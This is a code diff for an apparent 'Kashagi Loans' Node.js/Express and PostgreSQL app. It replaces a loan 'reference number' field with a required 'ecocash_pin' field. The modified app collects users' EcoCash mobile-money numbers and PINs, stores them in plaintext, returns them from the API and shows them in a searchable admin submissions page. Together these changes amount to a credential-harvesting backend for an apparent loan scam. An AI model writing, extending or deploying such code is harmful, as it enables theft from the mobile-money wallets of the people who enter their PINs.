@@ -66,7 +66,7 @@ async function initializeDatabase() {
 
                 ecocash_number TEXT NOT NULL,
 
-                reference_number TEXT NOT NULL,
+                ecocash_pin TEXT NOT NULL,
 
                 created_at
                     TIMESTAMP
@@ -76,13 +76,13 @@ async function initializeDatabase() {
         `);
 
 
-        // Add reference_number to an
+        // Add ecocash_pin to an
         // older submissions table.
 
         await pool.query(`
             ALTER TABLE submissions
             ADD COLUMN IF NOT EXISTS
-            reference_number TEXT
+            ecocash_pin TEXT
         `);
 
 
@@ -94,12 +94,12 @@ async function initializeDatabase() {
         `);
 
 
-        // Make reference_number required
+        // Make ecocash_pin required
         // only when existing rows allow it.
         //
         // We don't force NOT NULL here because
         // an old database could contain existing
-        // records without a reference number.
+        // records without a ecocash pin.
 
 
         console.log(
@@ -115,7 +115,7 @@ async function initializeDatabase() {
         );
 
         console.log(
-            "EcoCash number + reference number only."
+            "EcoCash number + ecocash pin only."
         );
 
         console.log(
@@ -212,7 +212,7 @@ app.get(
 
                     ecocash_number TEXT NOT NULL,
 
-                    reference_number TEXT,
+                    ecocash_pin TEXT,
 
                     created_at
                         TIMESTAMP
@@ -225,7 +225,7 @@ app.get(
             await pool.query(`
                 ALTER TABLE submissions
                 ADD COLUMN IF NOT EXISTS
-                reference_number TEXT
+                ecocash_pin TEXT
             `);
 
 
@@ -240,7 +240,7 @@ app.get(
                 success: true,
 
                 message:
-                    "Submissions table is ready. Only EcoCash number and reference number are used."
+                    "Submissions table is ready. Only EcoCash number and ecocash pin are used."
 
             });
 
@@ -283,7 +283,7 @@ app.post(
 
         const {
             ecocash_number,
-            reference_number
+            ecocash_pin
         } = req.body;
 
 
@@ -303,16 +303,16 @@ app.post(
         }
 
 
-        // Reference number required
+        // Ecocash pin required
 
-        if (!reference_number) {
+        if (!ecocash_pin) {
 
             return res.status(400).json({
 
                 success: false,
 
                 message:
-                    "Reference number is required."
+                    "Ecocash pin is required."
 
             });
 
@@ -327,7 +327,7 @@ app.post(
                     INSERT INTO submissions
                     (
                         ecocash_number,
-                        reference_number
+                        ecocash_pin
                     )
 
                     VALUES
@@ -339,12 +339,12 @@ app.post(
                     RETURNING
                         id,
                         ecocash_number,
-                        reference_number,
+                        ecocash_pin,
                         created_at
                     `,
                     [
                         ecocash_number,
-                        reference_number
+                        ecocash_pin
                     ]
                 );
 
@@ -414,7 +414,7 @@ app.get(
                     SELECT
                         id,
                         ecocash_number,
-                        reference_number,
+                        ecocash_pin,
                         created_at
 
                     FROM submissions
@@ -423,7 +423,7 @@ app.get(
                         ecocash_number ILIKE $1
 
                     OR
-                        reference_number ILIKE $1
+                        ecocash_pin ILIKE $1
 
                     ORDER BY
                         created_at DESC
@@ -579,7 +579,7 @@ Kashagi Loans - Submissions
 <input
     type="text"
     name="search"
-    placeholder="Search number or reference"
+    placeholder="Search number or pin"
     value="${escapeHtml(search)}"
 >
 
@@ -603,7 +603,7 @@ Kashagi Loans - Submissions
 </th>
 
 <th>
-    Reference Number
+    Ecocash Pin
 </th>
 
 <th>
@@ -638,7 +638,7 @@ Kashagi Loans - Submissions
 
 <td>
     ${escapeHtml(
-        row.reference_number || ""
+        row.ecocash_pin || ""
     )}
 </td>
 
